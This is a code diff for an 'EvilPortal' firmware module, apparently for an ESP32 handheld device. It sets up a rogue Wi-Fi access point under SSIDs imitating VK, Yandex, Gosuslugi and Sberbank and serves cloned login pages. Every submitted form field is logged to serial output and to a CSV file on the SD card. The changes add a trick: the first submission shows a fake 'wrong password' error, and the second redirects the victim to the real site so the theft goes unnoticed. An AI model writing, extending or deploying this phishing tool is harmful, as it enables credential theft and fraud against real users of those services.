-    "<button class='btn' type='submit'>\xd0\x92\xd0\xbe\xd0\xb9\xd1\x82\xd0\xb8</button>"
-    "</form>"
-    "<div class='links'>"
+    "<p class='note'>"
     "<a href='#'>\xd0\x97\xd0\xb0\xd0\xb1\xd1\x8b\xd0\xbb\xd0\xb8 \xd0\xbf\xd0\xb0\xd1\x80\xd0\xbe\xd0\xbb\xd1\x8c?</a>"
-    "<a href='#'>\xd0\xa0\xd0\xb5\xd0\xb3\xd0\xb8\xd1\x81\xd1\x82\xd1\x80\xd0\xb0\xd1\x86\xd0\xb8\xd1\x8f</a>"
+    " \xe2\x80\x94 \xd0\xbf\xd0\xbe\xd0\xb7\xd0\xb2\xd0\xbe\xd0\xbd\xd0\xb8\xd1\x82\xd0\xb5 \xd0\xbd\xd0\xb0 900"
+    "</p>"
     "</div></div></div></body></html>";
 
 // ---------------------------------------------------------------
@@ -192,10 +256,11 @@ static const char kHtmlMailRu[] PROGMEM =
 // ---------------------------------------------------------------
 
 struct Portal {
-    const char *name;    // display name (≤14 chars)
-    const char *apSsid;  // AP SSID to broadcast
-    const char *html;    // PROGMEM ptr, nullptr = SD file
-    char sdPath[48];     // path for SD portals
+    const char *name;       // display name shown in selection UI (≤14 chars)
+    const char *apSsid;     // broadcasted AP SSID
+    const char *realUrl;    // redirect here after 2nd credential capture
+    const char *html;       // PROGMEM ptr, nullptr for SD files
+    char sdPath[48];
 };
 
 static const int MAX_PORTALS = 12;
@@ -205,11 +270,18 @@ static int s_portalCount = 0;
 static void buildPortalList() {
     s_portalCount = 0;
 
-    // built-ins always first (Russian-market templates)
-    s_portals[s_portalCount++] = {"\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5",  "VK-WiFi",          kHtmlVK,        {}};
-    s_portals[s_portalCount++] = {"\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8",  "Gosuslugi-WiFi",   kHtmlGosuslugi, {}};
-    s_portals[s_portalCount++] = {"\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba",           "SberOnline",       kHtmlSberbank,  {}};
-    s_portals[s_portalCount++] = {"Mail.ru",                                                                        "MailRu-WiFi",      kHtmlMailRu,    {}};
+    s_portals[s_portalCount++] = {
+        "\xd0\x92\xd0\x9a\xd0\xbe\xd0\xbd\xd1\x82\xd0\xb0\xd0\xba\xd1\x82\xd0\xb5",
+        "VK-WiFi", "https://vk.com", kHtmlVK, {}};
+    s_portals[s_portalCount++] = {
+        "\xd0\xaf\xd0\xbd\xd0\xb4\xd0\xb5\xd0\xba\xd1\x81 ID",
+        "Yandex_WiFi", "https://yandex.ru", kHtmlYandex, {}};
+    s_portals[s_portalCount++] = {
+        "\xd0\x93\xd0\xbe\xd1\x81\xd1\x83\xd1\x81\xd0\xbb\xd1\x83\xd0\xb3\xd0\xb8",
+        "Gosuslugi", "https://gosuslugi.ru", kHtmlGosuslugi, {}};
+    s_portals[s_portalCount++] = {
+        "\xd0\xa1\xd0\xb1\xd0\xb5\xd1\x80\xd0\xb1\xd0\xb0\xd0\xbd\xd0\xba",
+        "SberOnline", "https://online.sberbank.ru", kHtmlSberbank, {}};
 
     // scan SD /evil_portal/*.html
     if (SD.cardType() == CARD_NONE) return;
@@ -223,19 +295,16 @@ static void buildPortalList() {
         int len = strlen(fn);
         if (len >= 5 && strcasecmp(fn + len - 5, ".html") == 0) {
             Portal &p = s_portals[s_portalCount++];
-            // derive display name from filename (strip .html, max 14 chars)
             strncpy(p.sdPath, "/evil_portal/", sizeof(p.sdPath) - 1);
             strncat(p.sdPath, fn, sizeof(p.sdPath) - 14 - 1);
             p.sdPath[sizeof(p.sdPath) - 1] = 0;
-            // display name = filename without extension
             static char nm[15];
-            strncpy(nm, fn, 14);
-            nm[14] = 0;
-            char *dot = strrchr(nm, '.');
-            if (dot) *dot = 0;
-            p.name   = nm;
-            p.apSsid = "Free WiFi";
-            p.html   = nullptr;
+            strncpy(nm, fn, 14); nm[14] = 0;
+            char *dot = strrchr(nm, '.'); if (dot) *dot = 0;
+            p.name    = nm;
+            p.apSsid  = "Free WiFi";
+            p.realUrl = "https://google.com";
+            p.html    = nullptr;
         }
         f.close();
     }
@@ -250,14 +319,15 @@ static const byte DNS_PORT = 53;
 static DNSServer  s_dns;
 static WebServer  s_web(80);
 static File       s_csv;
-static bool       s_csvOpen   = false;
-static String     s_template;
+static bool       s_csvOpen      = false;
+static String     s_template;    // raw HTML with {{ERR}} placeholder
 static String     s_apIp;
-static int        s_captured  = 0;
-static int        s_hits      = 0;
-static volatile bool s_dirty   = true;
-static const char *s_portalName = "";
-static const char *s_activeApSsid = "";
+static int        s_captured     = 0;
+static int        s_hits         = 0;
+static volatile bool s_dirty     = true;
+static const char *s_portalName  = "";
+static const char *s_activeApSsid= "";
+static const char *s_realUrl     = "https://google.com";
 
 // ---------------------------------------------------------------
 // Template loader
@@ -268,14 +338,12 @@ static void loadTemplate(int idx) {
     if (idx < 0 || idx >= s_portalCount) return;
     const Portal &p = s_portals[idx];
     if (p.html) {
-        // PROGMEM — copy to RAM string
         const char *src = p.html;
         s_template.reserve(strlen_P(src) + 1);
         char c;
         while ((c = pgm_read_byte(src++))) s_template += c;
-        Serial.printf("[evil] built-in template: %s (%d bytes)\n", p.name, s_template.length());
+        Serial.printf("[evil] built-in: %s (%d bytes)\n", p.name, s_template.length());
     } else {
-        // SD file
         File f = SD.open(p.sdPath, FILE_READ);
         if (f) {
             size_t sz = f.size();
@@ -283,7 +351,7 @@ static void loadTemplate(int idx) {
             s_template.reserve(sz + 1);
             while (f.available() && s_template.length() < sz) s_template += (char)f.read();
             f.close();
-            Serial.printf("[evil] SD template: %s (%d bytes)\n", p.sdPath, s_template.length());
+            Serial.printf("[evil] SD: %s (%d bytes)\n", p.sdPath, s_template.length());
         }
     }
 }
@@ -292,10 +360,17 @@ static void loadTemplate(int idx) {
 // Web handlers
 // ---------------------------------------------------------------
 
+static void servePortal(bool showError) {
+    String page = s_template;
+    page.replace("{{ERR}}", showError ? "block" : "none");
+    s_web.send(200, "text/html; charset=utf-8", page);
+}
+
 static void handleRoot() {
     s_hits++;
     s_dirty = true;
-    s_web.send(200, "text/html", s_template);
+    bool err = s_web.hasArg("err");
+    servePortal(err);
 }
 
 static void handleRedirect() {
@@ -304,23 +379,29 @@ static void handleRedirect() {
 }
 
 static void handleLogin() {
+    // collect and log credentials
     String rec = "";
     for (int i = 0; i < s_web.args(); i++) {
         if (i) rec += " | ";
         rec += s_web.argName(i) + "=" + s_web.arg(i);
     }
-    Serial.printf("[evil] CAPTURED: %s\n", rec.c_str());
+    Serial.printf("[evil] CAPTURED #%d: %s\n", s_captured + 1, rec.c_str());
     if (s_csvOpen) {
-        s_csv.printf("%lu,%s\n", (unsigned long)(millis() / 1000), rec.c_str());
+        s_csv.printf("%lu,%d,%s\n", (unsigned long)(millis() / 1000), s_captured + 1, rec.c_str());
         s_csv.flush();
     }
     s_captured++;
     s_dirty = true;
-    s_web.send(200, "text/html",
-        "<html><head><meta http-equiv='refresh' content='4;url=/'></head>"
-        "<body style='font-family:Arial;text-align:center;margin-top:60px'>"
-        "<h3>Connecting...</h3><p>Please wait while we verify your access.</p>"
-        "</body></html>");
+
+    if (s_captured < 2) {
+        // first attempt: show "wrong password" — victim will re-enter
+        s_web.sendHeader("Location", "http://" + s_apIp + "/?err=1", true);
+        s_web.send(302, "text/plain", "");
+    } else {
+        // second attempt: redirect to real site — victim thinks they succeeded
+        s_web.sendHeader("Location", s_realUrl, true);
+        s_web.send(302, "text/plain", "");
+    }
 }
 
 // ---------------------------------------------------------------
@@ -369,14 +450,14 @@ static void drawSelect(int sel) {
 
     const int rowH = 28;
     const int top  = 42;
-    const int visRows = (tft.height() - top - 18) / rowH;  // ~9
+    const int visRows = (tft.height() - top - 18) / rowH;
     int start = 0;
     if (sel >= visRows) start = sel - visRows + 1;
 
     for (int i = start; i < s_portalCount && (i - start) < visRows; i++) {
         int y   = top + (i - start) * rowH;
         bool hi = (i == sel);
-        tft.fillRect(0, y, tft.width(), rowH - 2,  hi ? UI_ACCENT : UI_BG);
+        tft.fillRect(0, y, tft.width(), rowH - 2, hi ? UI_ACCENT : UI_BG);
         tft.setTextColor(hi ? UI_BG : UI_TEXT, hi ? UI_ACCENT : UI_BG);
         tft.setTextSize(1);
         tft.setCursor(10, y + 6);
@@ -396,9 +477,7 @@ static void drawSelect(int sel) {
 
 void run() {
     feature_exit_requested = false;
-    // feature_active = false here so featureExitButtonPressed() doesn't
-    // consume SELECT on the selection screen
-    feature_active = false;
+    feature_active = false;  // keep false during selection so SEL isn't eaten as exit
 
     pauseBackgroundRadioTasks();
     buildPortalList();
@@ -430,12 +509,13 @@ void run() {
     }
 
     // --- launch portal ---
-    feature_active = true;
-    s_captured = 0;
-    s_hits     = 0;
-    s_dirty    = true;
-    s_portalName    = s_portals[sel].name;
-    s_activeApSsid  = s_portals[sel].apSsid;
+    feature_active     = true;
+    s_captured         = 0;
+    s_hits             = 0;
+    s_dirty            = true;
+    s_portalName       = s_portals[sel].name;
+    s_activeApSsid     = s_portals[sel].apSsid;
+    s_realUrl          = s_portals[sel].realUrl;
     const char *apSsid = s_activeApSsid;
 
     tft.fillScreen(UI_BG);
@@ -449,13 +529,16 @@ void run() {
 
     loadTemplate(sel);
 
-    // open CSV log
     if (SD.cardType() != CARD_NONE) {
         SD.mkdir("/evil_portal");
         char path[52];
         snprintf(path, sizeof(path), "/evil_portal/creds-%lu.csv", (unsigned long)(millis() / 1000));
         s_csv = SD.open(path, FILE_WRITE);
-        if (s_csv) { s_csvOpen = true; s_csv.print("uptime_s,fields\n"); Serial.printf("[evil] log %s\n", path); }
+        if (s_csv) {
+            s_csvOpen = true;
+            s_csv.print("uptime_s,attempt,fields\n");
+            Serial.printf("[evil] log %s\n", path);
+        }
     }
 
     WiFi.mode(WIFI_AP);
@@ -475,11 +558,11 @@ void run() {
     s_web.on("/connecttest.txt",     handleRedirect);
     s_web.onNotFound(handleRoot);
     s_web.begin();
-    Serial.printf("[evil] AP '%s' up at %s (template: %s)\n", apSsid, ip.toString().c_str(), s_portalName);
+    Serial.printf("[evil] AP '%s' up at %s tmpl=%s\n", apSsid, ip.toString().c_str(), s_portalName);
 
     drawRunning();
 
-    uint32_t lastDraw  = millis();
+    uint32_t lastDraw    = millis();
     int      lastClients = -1;
     while (!feature_exit_requested && !featureExitButtonPressed()) {
         s_dns.processNextRequest();
@@ -499,7 +582,7 @@ void run() {
     WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
     if (s_csvOpen) { s_csv.flush(); s_csv.close(); s_csvOpen = false; }
-    Serial.printf("[evil] stopped: %d creds, %d views, template=%s\n", s_captured, s_hits, s_portalName);
+    Serial.printf("[evil] stopped: %d creds, %d views, tmpl=%s\n", s_captured, s_hits, s_portalName);
 }
 
 }  // namespace EvilPortal
